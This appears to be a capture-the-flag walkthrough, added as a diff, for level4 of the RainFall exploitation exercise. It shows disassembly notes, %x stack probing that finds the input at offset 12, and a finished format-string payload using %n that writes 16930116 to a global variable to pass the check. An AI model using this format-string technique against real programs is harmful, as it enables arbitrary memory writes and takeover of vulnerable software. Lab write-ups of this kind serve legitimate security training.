@@ -1,0 +1,28 @@
+# Let's start as usual with info variables, info function, objdump -d level4
+# We can see a m variable, printf, gets, system, p, n and main function
+# Seems like it's the same process than last level
+objdump -d level4
+disas n
+disas p
+# In n function there is a cmp between 0x1025544,%eax, with eax being our m variable
+info variables
+# 0x08049810  m
+#  804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
+#  8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
+#  value of 0x1025544 in decimal is : 16930116
+#  Let's try the same soluce than last level but with this size
+# For that we need to check where is stored what we give toour program, we'll use again %x
+level4@RainFall:~$ ./level4
+AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520
+
+./level4
+AAAA %12$x
+AAAA 41414141
+# Let's use struct to have correct address for our m variable
+# >>> struct.pack("I", 0x8049810)
+# '\x10\x98\x04\x08'
+# Let's not forget to sub the size of our m variable which is 4.
+# So let's print with 16930116 - 4
+echo -e "\x10\x98\x04\x08%16930112x%12\$n" | ./level4
+
